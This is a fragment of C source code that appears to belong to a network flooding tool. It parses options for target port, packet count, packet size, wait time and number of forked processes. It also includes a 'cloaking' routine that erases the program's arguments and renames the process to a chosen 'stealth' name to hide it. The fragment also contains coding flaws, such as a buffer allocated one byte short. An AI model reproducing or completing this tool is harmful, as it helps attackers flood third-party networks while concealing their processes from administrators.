```
```c
strcpy (stealth, optarg);
break;
case 'd':
    dsport = atoi(optarg);
    break;
case 'n':
    numpacks = atoi(optarg);
    break;
case 'p':
    psize = atoi(optarg);
    break;
case 'w':
    wait = atoi(optarg);
    break;
case 'o':
    srcport = atoi(optarg);
    break;
case 'f':
    forknum = atoi(optarg);
    break;
default:
    usage (argv[0]);
}
if (!stealth)
    stealth = Default_Stealth;
if (!forknum)
    forknum = Default_Fork;
if (!argv[optind]) {
    printf ("\n\n%s[%s*%s]%%s Bzzzt .. We need a Place for the Packets to
Go%s\n",DC,W,DC,DR,RESTORE);
    exit (EXIT_FAILURE);
}
target = (char *) malloc (strlen (argv[optind]));
if (!target) {
    printf ("\n\n%s[%s*%s]%%s Unable to Allocate Required Amount of Memory  for Task%s\n",DC,W,DC,DR,RESTORE);
    perror ("malloc");
    exit (EXIT_FAILURE);
}

strcpy (target, argv[optind]);
}
int cloaking (int argc, char *argv[])
{
    int x;

    for (x = argc-1; x >= 0; x--)

    memset (argv[x], 0, strlen (argv[x]));
    strcpy (argv[0],stealth);

return(0);
```
```